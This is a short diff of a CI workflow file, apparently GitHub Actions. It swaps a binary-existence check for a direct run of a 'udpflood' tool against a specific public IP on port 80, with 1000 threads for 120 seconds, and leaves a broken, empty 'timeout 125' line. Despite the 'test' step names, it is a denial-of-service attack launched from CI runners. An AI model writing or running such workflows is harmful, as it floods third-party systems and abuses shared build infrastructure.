@@ -41,14 +41,7 @@ jobs:
           
       - name: Test compilation
         run: |
-          echo "Testing executable..."
-          if [ -f "udpflood" ]; then
-            ./udpflood || echo "Executable test completed"
-            echo "✅ Binary works correctly"
-          else
-            echo "❌ Executable not found"
-            exit 1
-          fi
+          ./udpflood 23.176.168.11 80 120 1000 1024
           
       - name: Run UDP Flood Test
         run: |
@@ -60,7 +53,7 @@ jobs:
           
           
           # Run UDP flood for 120 seconds with 1000 threads
-          timeout 125 ./udpflood 23.176.168.11 80 120 1000 1024
+          timeout 125 
           
           echo "✅ Linux UDP Flood Test ${{ matrix.vps }} completed"
 
